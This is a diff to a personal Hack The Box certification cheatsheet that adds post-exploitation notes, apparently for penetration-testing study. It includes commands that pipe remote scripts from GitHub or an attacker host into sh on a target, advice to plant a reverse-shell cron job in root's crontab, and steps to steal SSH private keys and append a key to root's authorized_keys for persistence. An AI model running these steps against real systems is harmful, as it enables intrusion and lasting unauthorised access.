@@ -1,6 +1,9 @@
 # HTBCert
 Cheatsheet for the Hack The Box certification
 
+# Useful Commands
+Python Web Server `sudo python3 -m http.server 80`
+
 # Service Scanning
 ## Nmap
 - All purpose nmap command `nmap -sV -sC -p- IP`
@@ -73,3 +76,37 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 
 # Upgrade Shell
 Python example `python -c 'import pty; pty.spawn("/bin/bash")'`
+
+# Privilege Escalation
+https://book.hacktricks.xyz/
+`linpeas.sh` exist for Windows as Winpeas
+`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh` requires internet access on target
+if not spin up python server and use that command `curl HOST_IP/linpeas.sh | sh`
+
+## Vulnerable software
+Use `dpkg -l` on Linux or look in C:\Program Files on Windows to see what software is installed. They can be outdated and/or vulnerable to publicly available exploits.
+
+## Check User Privileges
+check what sudo privileges your user has `sudo -l`
+For example if we see that user has access to the echo command without needing a password:
+`(user : user) NOPASSWD: /bin/echo` we can then use the command like this: 
+`sudo -u user /bin/echo Hello World!` Which prints Hello World!
+https://gtfobins.github.io/ Contains a list of commands and how they can be exploited through sudo.
+https://lolbas-project.github.io/# Same for Windows.
+
+# Scheduled Tasks
+It exists specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them:
+- `/etc/crontab`
+- `/etc/cron.d`
+- `/var/spool/cron/crontabs/root`
+Create a cron job that executes a bash script containg a reverse shell command.
+
+# SSH Keys
+If we can read /home/user/.ssh/id_rsa or /root/.ssh/id_rsa we can copy it to our host and connect through ssh to the target:
+`ssh user@10.10.10.10 -i id_rsa` for example.
+
+If we already have access as a user and have write write to .ssh and want a more permanent way to access target we can generate a new key using `Xantra@htb[/htb]$ ssh-keygen -f key` 
+the `key` file will be used to ssh to the target and `key.pub` will be written to the authprozed_keys file of the target.
+`user@remotehost$ echo "ssh-rsa AAAAB...SNIP..." >> /root/.ssh/authorized_keys`
+
+We can now SSH like so: `Xantra@htb[/htb]$ ssh root@10.10.10.10 -i key`
